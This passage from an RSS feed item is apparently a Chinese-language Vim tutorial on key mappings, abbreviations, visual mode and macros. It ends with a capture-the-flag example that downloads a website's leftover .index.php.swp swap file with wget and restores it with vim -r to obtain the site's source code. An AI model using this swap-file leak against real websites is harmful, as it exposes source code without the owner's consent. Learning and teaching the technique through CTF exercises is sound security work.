          &lt;td&gt;&lt;strong&gt;普通模式不可递归&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:nnoremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;在普通模式下使用，避免递归映射&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;插入模式不可递归&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:inoremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;在插入模式下使用，避免递归映射&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;可视模式不可递归&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:vnoremap &amp;lt;key&amp;gt; &amp;lt;command&amp;gt;&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;在可视模式下使用，避免递归映射&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;缩写&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;:ab [缩写] [完整文本]&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;&lt;strong&gt;输入缩写后空格，自动扩展为完整文本&lt;/strong&gt;。例如：&lt;code&gt;:ab email xxxx@gmail.com&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;什么是&amp;lt;key&amp;gt;？&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;lt;key&amp;gt; 对应的是 ^[A-Z] ， 定义快捷键时使用ctrl+v+[a-z]，使用快捷键时用对应的ctrl+[a-z]&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;什么是递归映射？&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nmap j gg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nmap Q j
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;如果已经做了以上映射，那么按下Q，执行的将是gg而不是j&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;为了避免以上问题，应该这样定义：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nnoremap j gg
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:nnoremap Q j
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;几个例子&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:map ^D Ahelloworld&amp;lt;ESC&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;在文件的光标所在行的行尾，添加 helloworld 字符串，按住组合键 ctrl + d 就会执行操作&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:map ^M I#&amp;lt;ESC&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;在文件光标处所在行的行首插入#，按住组合键 ctrl + m 就会执行操作&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;:ab email xxxx@gmail.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;输入 email+空格 会把输入的 email 自动替换成 xxxx @gmail.com&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;可视化模式&#34;&gt;可视化模式
&lt;/h3&gt;&lt;h4 id=&#34;进入可视化模式&#34;&gt;进入可视化模式
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;可视化模式可以分为以下三种：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;v&lt;/strong&gt; &amp;ndash; &lt;strong&gt;字符可视化模式&lt;/strong&gt;，文本选择是以&lt;strong&gt;字符&lt;/strong&gt;为单位的&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;V&lt;/strong&gt; &amp;ndash; &lt;strong&gt;行可视化模式&lt;/strong&gt;，文本选择是&lt;strong&gt;以行&lt;/strong&gt;为单位的&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ctrl-V&lt;/strong&gt; &amp;ndash; &lt;strong&gt;块可视化模式&lt;/strong&gt;，可以选择一个&lt;strong&gt;矩形内&lt;/strong&gt;的文本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在任意可视化模式下使用以上命令，将会切换到对应模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;在任意可视化模式下使用I（大写i），将会切换到插入模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;gv&lt;/strong&gt; &amp;ndash; 进入上一次的可视化模式，并选中当时选中的文本**（命令模式也能用此命令）**&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span style=&#34;color:red&#34;&gt;&lt;strong&gt;按 ESC 键可随时退出可视化模式&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h4 id=&#34;可视化模式下移动光标&#34;&gt;可视化模式下移动光标
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;命令模式下的光标移动方法仍然适用&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;进入任意可视化模式，移动光标，会从当前位置开始，以相应方式高亮选中字符&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;o&lt;/strong&gt; &amp;ndash;  移动光标到已经选取的文本的&lt;strong&gt;结尾处&lt;/strong&gt;或者&lt;strong&gt;开头处&lt;/strong&gt;（根据现在光标所在位置确定）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;如果是块可视化模式，移动光标到对角处
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;O&lt;/strong&gt; &amp;ndash; 在&lt;strong&gt;块可视化&lt;/strong&gt;模式下，移动光标到&lt;strong&gt;同一行的结尾处或者开头处&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;可视化模式下编辑&#34;&gt;可视化模式下编辑
&lt;/h4&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;大部分命令模式对内容操作的命令都能在可视化模式下使用，比如：&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;d&lt;/strong&gt; &amp;ndash; 删除高亮文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;D&lt;/strong&gt; &amp;ndash; 删除一整行文本，&lt;strong&gt;即使只有一部分被选中了&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;c&lt;/strong&gt; &amp;ndash; 删除高亮文本并进入插入模式&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;y&lt;/strong&gt; &amp;ndash; 复制高亮文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Y&lt;/strong&gt; &amp;ndash; 复制一整行文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;p&lt;/strong&gt; &amp;ndash; 黏贴复制的文本&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;~&lt;/strong&gt; &amp;ndash; 对高亮文本进行&lt;strong&gt;大小写转换&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&amp;gt; / &amp;lt;&lt;/strong&gt; &amp;ndash; 对高亮文本增加/减少缩进，幅度为&lt;strong&gt;一个Tab键&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;r&lt;/strong&gt; &amp;ndash; 输入单个字符，把高亮文本所有字符逐个替换为该字符&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;vim宏录制&#34;&gt;vim宏录制
&lt;/h2&gt;&lt;h3 id=&#34;宏录制的录制操作&#34;&gt;宏录制的录制操作
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;假设需要将文本的每一行的行首插入入一个 tab 键&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;先将光标移动到第一行，在普通模式下按下 q 键（&lt;strong&gt;宏录制是 q 键启动的&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;按一个 a （字母随意）,表示该宏注册为 a&lt;/li&gt;
&lt;li&gt;按下 I 在行首插入一个 tab 键&lt;/li&gt;
&lt;li&gt;按下ESC退出编辑模式&lt;/li&gt;
&lt;li&gt;按下 j 将光标移动到下一行行首&lt;/li&gt;
&lt;li&gt;按下 q 键完成录制操作（&lt;strong&gt;宏录制是 q 键结束的&lt;/strong&gt;）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;mark&gt;主要步骤：&lt;strong&gt;q(开始）&lt;/strong&gt;-&amp;gt; &lt;strong&gt;a(命名)&lt;/strong&gt; -&amp;gt; &lt;strong&gt;操作&lt;/strong&gt; -&amp;gt; &lt;strong&gt;q(结束)&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;h3 id=&#34;宏录制的使用&#34;&gt;宏录制的使用
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;@a&lt;/strong&gt; &amp;ndash; 执行a宏录制的一系列动作，注意&lt;strong&gt;a是录制的操作名称&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;n@a&lt;/strong&gt; &amp;ndash; 执行&lt;strong&gt;n次&lt;/strong&gt;a宏&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;@@&lt;/strong&gt; &amp;ndash; 重复上一次使用的宏操作&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;vim相关案例&#34;&gt;VIM相关案例
&lt;/h1&gt;&lt;h2 id=&#34;vim缓存泄露&#34;&gt;vim缓存泄露
&lt;/h2&gt;&lt;h3 id=&#34;vim交换文件&#34;&gt;vim交换文件
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;现在用vim打开文件1.txt，直接关闭终端，再次试图用vim打开1.txt时会出现如下提示：&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250311194714710.png&#34; alt=&#34;image-20250311194714710&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;p&gt;选择恢复（R），弹出如下提示：&lt;/p&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250311195430374.png&#34; style=&#34;zoom: 67%;&#34; /&gt;
&lt;p&gt;&lt;strong&gt;Vim 中，当处理同一个文件发生多次异常退出时，它会依次使用不同的后缀来命名交换文件。按照你给出的模式，首次产生的交换文件名为 &lt;code&gt;.index.php.swp&lt;/code&gt;，再次意外退出后产生 &lt;code&gt;.index.php.swo&lt;/code&gt;，第三次产生的交换文件为 &lt;code&gt;.index.php.swn&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;从第四次开始及之后的交换文件，Vim 会循环使用这三个后缀（.swp, .swo, .swn）&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;例题&#34;&gt;例题
&lt;/h3&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/4b76d009d10ed0cb65aaad6f5f85d2cc.png&#34; alt=&#34;在这里插入图片描述&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;p&gt;使用以下命令获取网站中的vim文件缓存：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wget http://xxx/.index.php.swp -P /home       //-P指定下载位置
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用vim -r恢复文件并打开:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vim -r .index.php.swp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;获取到网站源码后，进行代码审计即可&lt;/p&gt;
</description>
        </item>
        
    </channel>
</rss>
